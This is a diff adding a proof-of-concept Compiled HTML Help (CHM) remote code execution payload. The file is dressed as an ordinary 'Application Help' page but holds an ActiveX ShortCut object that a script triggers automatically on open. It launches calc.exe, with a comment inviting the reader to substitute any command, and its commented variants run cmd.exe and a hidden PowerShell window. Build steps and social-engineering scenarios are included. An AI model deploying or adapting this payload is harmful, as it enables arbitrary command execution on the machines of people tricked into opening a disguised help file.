@@ -1,0 +1,67 @@
+<!--
+  CHM RCE Payload — Command Execution via Compiled HTML Help
+
+  Attack Vector:
+    Many desktop apps open .chm help files. If the app opens CHM from
+    user-controlled paths, or if a CHM can be placed in the help directory,
+    arbitrary commands execute when the CHM is opened.
+
+  Build:
+    1. Save this as content.html
+    2. Create a .hhp project file (see chm_project.hhp)
+    3. Compile: hhc.exe project.hhp → produces payload.chm
+    4. Alternative: use nishang's Out-CHM or use the build script
+
+  Test Scenarios:
+    - Application loads .chm from a writable path
+    - Application opens .chm via file association
+    - User is tricked into opening .chm from a share
+    - .chm file is embedded in a .zip import
+-->
+
+<html>
+<head>
+<title>Application Help Guide</title>
+</head>
+<body>
+
+<h1>Application Help</h1>
+
+<!-- PoC 1: ActiveX ShortCut object (most common, works on older systems) -->
+<OBJECT id=shortcut classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+    <PARAM name="Command" value="ShortCut">
+    <PARAM name="Button" value="Bitmap::shortcut">
+    <!-- calc.exe PoC — replace with your command -->
+    <PARAM name="Item1" value=",calc.exe,">
+    <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+
+<!-- PoC 2: cmd /c for complex commands -->
+<!--
+<OBJECT id=cmd classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+    <PARAM name="Command" value="ShortCut">
+    <PARAM name="Button" value="Bitmap::shortcut">
+    <PARAM name="Item1" value=",cmd.exe,/c whoami > C:\temp\chm_poc.txt">
+    <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+-->
+
+<!-- PoC 3: PowerShell execution -->
+<!--
+<OBJECT id=ps classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+    <PARAM name="Command" value="ShortCut">
+    <PARAM name="Button" value="Bitmap::shortcut">
+    <PARAM name="Item1" value=",powershell.exe,-nop -w hidden -c calc.exe">
+    <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+-->
+
+<script language="javascript">
+    shortcut.Click();
+</script>
+
+<p>Welcome to the application help system. This document contains
+troubleshooting information and usage guides.</p>
+
+</body>
+</html>
